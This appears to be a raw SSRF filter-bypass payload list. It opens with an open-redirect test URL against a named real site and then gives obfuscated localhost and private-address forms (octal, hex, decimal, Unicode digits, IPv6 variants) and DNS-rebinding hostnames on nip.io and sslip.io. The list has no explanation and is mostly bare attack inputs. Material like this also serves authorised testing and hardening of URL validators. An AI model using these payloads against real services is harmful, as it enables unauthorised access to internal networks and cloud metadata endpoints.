### test with redirect
```
https://www.roninfo.ru/redir.php?q=http://bing.com@{payload}
```

### ipv4 Bypass 
```
http://①②⑦.⓪.⓪.①
http://127。0。0。1
http://localhost
http://127.1
http://0.0.0.0
http://0
http://2130706433
http://017700000001
http://0x7f000001
http://0x7f.0.0.1
http://0177.0000.0000.0001
http://2130706433
http://0177.0.0.1
http://10.0.0.1:80
http://172.31.22.1:443
http://192.168.1.1:8080
http://172.31.22.220:80
```

### ipv4 Bypass with DNS Rebinding
```
http://127.0.0.1.nip.io
http://127.0.0.2.nip.io
http://localtest.me
http://google.com.127.0.0.1.nip.io
http://google.com.0.0.0.0.nip.io
http://google.com.192.168.1.1.nip.io
http://google.com.172.31.22.1.nip.io
http://google.com.10.0.0.1.nip.io
http://google.com.192.168.1.1.nip.io
```

### IPv6 Bypass
```
http://[::ffff:127.0.0.1]
http://[::1]
http://[64:ff9b:1::7f00:1]
http://[0:0:0:0:0:0:0:1]
http://[0:0:0:0:0:ffff:7f00:1]
http://[::127.0.0.1]
http://[fd00::1]
http://[fc00::1]
http://[fe80::1]
http://[0000:0000:0000:0000:0000:0000:0000:0001]
```

### IPv6 for DNS Bypass
```
http://0-0-0-0-0-ffff-7f00-1.sslip.io
http://0-0-0-0-0-0-0-1.sslip.io
http://64-ff9b-1-0-0-0-7f00-1.sslip.io
http://0-0-0-0-0-0-7f00-1.sslip.io
http://fd00-0-0-0-0-0-0-1.sslip.io
http://fc00-0-0-0-0-0-0-1.sslip.io
http://fe80-0-0-0-0-0-0-1.sslip.io
```

### i not hink these works
```
http://2001-db8--1.ip6.name
http://--ffff-127.0.0.1.sslip.io
http://64-ff9b-1--7f00-1.sslip.io
http://--127.0.0.1.sslip.io
http://fc00--1.sslip.io
http://fe80--1.sslip.io
http://--1.sslip.io
http://--ffff-7f00-1.sslip.io

http://[::1%25eth0]
http://[::1%2511]
```
